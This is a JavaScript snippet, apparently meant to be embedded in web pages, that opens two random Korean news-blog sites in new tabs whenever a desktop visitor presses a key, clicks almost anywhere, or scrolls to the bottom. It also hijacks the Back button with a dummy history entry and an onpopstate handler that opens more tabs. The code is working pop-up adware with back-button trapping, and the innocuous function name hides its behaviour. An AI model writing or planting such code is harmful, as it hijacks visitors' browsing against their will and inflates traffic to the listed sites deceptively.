function handleKeyPress(event) {
    const urls = [
        'https://blog3news.tistory.com/',
        'https://1-news.tistory.com/',
        'https://newsfactory.iwinv.net/',
    ];

    function getRandomUrls(arr, num) {
        const shuffled = arr.sort(() => 0.5 - Math.random());
        return shuffled.slice(0, num);
    }
    
    const randomUrls = getRandomUrls(urls, 2);
    randomUrls.forEach(url => window.open(url, '_blank'));
}

// Check if the screen width is greater than a certain threshold (e.g., 768px for desktop)
function isDesktop() {
    return window.innerWidth > 768;
}

// Only add event listeners and execute actions on desktop
if (isDesktop()) {
    window.addEventListener('scroll', () => {
        const scrollHeight = document.documentElement.scrollHeight;
        const scrollTop = document.documentElement.scrollTop || document.body.scrollTop;
        const clientHeight = document.documentElement.clientHeight;

        if (scrollTop + clientHeight >= scrollHeight) {
            handleKeyPress();
        }
    });

    document.addEventListener('keydown', handleKeyPress);

    document.documentElement.addEventListener('click', (event) => {
        // Check if the clicked element has the id 'click'
        if (event.target.id !== 'click') {
            handleKeyPress(event); // Only trigger the popup if the clicked element is not 'click'
        }
    });

    history.pushState(null, null, "");
    window.onpopstate = function(a) {
        if (a) {
            history.back();
            handleKeyPress();
        }
    };
}
